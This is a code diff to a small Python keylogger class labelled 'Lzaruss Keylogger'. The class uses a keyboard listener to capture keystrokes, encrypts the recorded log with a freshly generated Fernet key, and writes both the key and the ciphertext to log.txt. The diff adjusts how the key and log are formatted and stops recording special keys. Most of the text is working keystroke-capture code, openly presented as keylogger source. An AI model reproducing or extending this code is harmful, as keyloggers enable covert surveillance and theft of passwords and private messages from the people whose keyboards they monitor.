@@ -3,7 +3,7 @@ from cryptography.fernet import Fernet
 
 class Keylogger:
     def __init__(self):
-        self.head = 'Lzaruss Keylogger:'
+        self.head = 'Lzaruss Keylogger:\n'
         self.log = ''
         self.cifrado = None
 
@@ -23,20 +23,22 @@ class Keylogger:
             elif key == keyboard.Key.space:
                 self.log += " "
             else:
-                self.log += str(key)
+                #self.log += str(key)
+                pass
 
     def save_data(self, log: str):
-        #vamos a probar vamos a probar
         log_b = log.encode("utf-8")
         cypher = self.cifrado.encrypt(log_b)
+        cypherS = cypher.decode('utf-8')
         with open("log.txt", "w", encoding='UTF-8') as f:
-            f.write(self.head+str(cypher))
+            f.write(self.head+"\n"+(cypherS))
 
     def start(self):
 
         clave = Fernet.generate_key()
         self.cifrado = Fernet(clave)
-        self.head += f'\n{clave}\n'
+        passw = clave.decode('utf-8')
+        self.head += f'{passw}'
 
         with keyboard.Listener(on_press=self.on_press) as listener:
             listener.join()
